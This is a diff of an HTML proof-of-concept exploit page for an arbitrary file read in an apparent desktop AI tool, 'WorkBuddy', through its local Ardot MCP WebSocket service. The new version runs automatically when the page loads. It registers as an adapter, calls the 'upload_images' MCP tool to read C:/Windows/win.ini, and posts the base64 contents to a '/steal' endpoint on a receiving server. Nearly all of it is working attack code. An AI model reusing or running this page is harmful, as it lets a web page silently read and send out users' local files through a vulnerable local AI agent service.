@@ -1,78 +1,47 @@
-<!DOCTYPE html>
-<html lang="zh">
-<head>
-<meta charset="UTF-8">
-<title>Ardot MCP 任意文件读取 POC</title>
-<style>
-body{font-family:sans-serif;background:#111;color:#0f0;padding:20px;max-width:900px;margin:auto}
-pre{background:#000;padding:15px;border:1px solid #333;white-space:pre-wrap;word-break:break-all;max-height:400px;overflow:auto}
-button{padding:10px 20px;background:#0a0;color:#fff;border:none;cursor:pointer;font-size:16px}
-.log{color:#aaa}
-</style>
-</head>
-<body>
-<h2>WorkBuddy Ardot MCP 任意文件读取 POC</h2>
-<p class="log">这个页面尝试连接本机 WorkBuddy 的 Ardot MCP 服务（ws://127.0.0.1:50551）读取文件。<br>
-如果你的本机正在运行 WorkBuddy Desktop，点击下方按钮即可读取指定文件内容（base64 + 解码）。</p>
-<input id="fpath" value="C:/Windows/win.ini" size="50">
-<button onclick="run()">读取文件</button>
-<div id="out"></div>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>POC</title></head>
+<body><h2>WorkBuddy Ardot POC</h2><div id="out"></div>
 <script>
-window.onload = () => setTimeout(run, 1000);
-const SESSION = "pwn-" + Date.now();
-let ws = null;
-
-function log(s) { document.getElementById('out').innerHTML += '<div>' + s + '</div>'; }
-
-function emit(ev, data) { if (ws && ws.readyState === 1) ws.send('42' + JSON.stringify([ev, data])); }
-
-function run() {
-  const target = document.getElementById('fpath').value;
-  log('[*] 连接 ws://127.0.0.1:50551/ws/adapters ...');
-  try {
-    ws = new WebSocket('ws://127.0.0.1:50551/ws/adapters/?EIO=4&transport=websocket');
-  } catch(e) { log('[-] WebSocket 创建失败: ' + e); return; }
-
-  ws.onopen = () => log('[+] WebSocket 已连接');
-  ws.onerror = (e) => log('[-] WebSocket 错误: ' + (e.message||''));
-  ws.onmessage = (e) => {
+window.onload = () => setTimeout(run, 800);
+const SESSION = "pwn-" + Date.now(); let ws = null;
+function log(s){ document.getElementById('out').innerHTML += '<div>'+s+'</div>'; }
+function emit(ev,d){ if(ws && ws.readyState===1) ws.send('42'+JSON.stringify([ev,d])); }
+function run(){
+  log('[*] connecting ws://127.0.0.1:50551');
+  try { ws = new WebSocket('ws://127.0.0.1:50551/ws/adapters/?EIO=4&transport=websocket'); }
+  catch(e){ log('[-] WS err: '+e); return; }
+  ws.onerror = e => log('[-] WS error');
+  ws.onmessage = e => {
     const d = e.data.toString();
-    if (d.startsWith('0')) { ws.send('40'); }
-    else if (d.startsWith('40')) {
-      log('[+] socket.io 已连接，注册 adapter ...');
-      emit('message', {type:'register', role:'adapter-relay', metadata:{sessionId:SESSION}});
+    if(d.startsWith('0')) ws.send('40');
+    else if(d.startsWith('40')){
+      log('[+] socket.io connected, register');
+      emit('message',{type:'register',role:'adapter-relay',metadata:{sessionId:SESSION}});
     }
-    else if (d.includes('register_ack')) {
-      log('[+] adapter 注册成功，调用 upload_images 读取: ' + target);
-      // 调 MCP 读文件
-      fetch('http://127.0.0.1:50551/api/v1/mcp', {
-        method:'POST',
+    else if(d.includes('register_ack')){
+      log('[+] adapter registered, read file');
+      fetch('http://127.0.0.1:50551/api/v1/mcp',{method:'POST',
         headers:{'Content-Type':'application/json','Accept':'application/json, text/event-stream'},
-        body: JSON.stringify({jsonrpc:'2.0',id:1,method:'tools/call',
-          params:{name:'upload_images',
-            arguments:{items:[{nodeId:'1',filePath:target}]},
-            _meta:{'workbuddy.ai/sessionId':SESSION}}})
-      }).then(r=>r.text()).then(t=>log('[MCP] '+t.slice(0,300))).catch(e=>log('[-] fetch 失败: '+e));
+        body:JSON.stringify({jsonrpc:'2.0',id:1,method:'tools/call',
+          params:{name:'upload_images',arguments:{items:[{nodeId:'1',filePath:'C:/Windows/win.ini'}]},
+            _meta:{'workbuddy.ai/sessionId':SESSION}}})})
+        .then(r=>r.text()).then(t=>log('[MCP] '+t.slice(0,150))).catch(e=>log('[-] fetch fail: '+e));
     }
-    else if (d.includes('tool_request')) {
-      try {
+    else if(d.includes('tool_request')){
+      try{
         const pkt = JSON.parse(d.slice(2));
-        const items = pkt[1] && pkt[1].params ? pkt[1].params.items : null;
-        if (items && items[0] && items[0].data) {
+        const items = pkt[1]?.params?.items;
+        if(items && items[0]?.data){
           const b64 = items[0].data;
-          log('<b style="color:#0f0">[+] 读取到文件内容 (base64):</b><pre>' + b64 + '</pre>');
-          try {
-            const bin = atob(b64);
-            const bytes = new Uint8Array(bin.length);
-            for (let i=0;i<bin.length;i++) bytes[i] = bin.charCodeAt(i);
-            const text = new TextDecoder('utf-8').decode(bytes);
-            log('<b style="color:#0f0">[+] 解码内容:</b><pre>' + text + '</pre>');
-          } catch(e2) { log('[-] 解码失败: ' + e2); }
+          log('[+] FILE READ OK');
+          // 外发到本机接收服务器
+          try{
+            fetch('http://127.0.0.1:9000/steal',{method:'POST',
+              headers:{'Content-Type':'text/plain'},body:'WININI:'+b64});
+            log('[+] exfil attempt to 127.0.0.1:9000');
+          }catch(e2){ log('[-] exfil fail'); }
         }
-      } catch(e3) {}
+      }catch(e3){}
     }
   };
 }
-</script>
-</body>
-</html>
+</script></body></html>
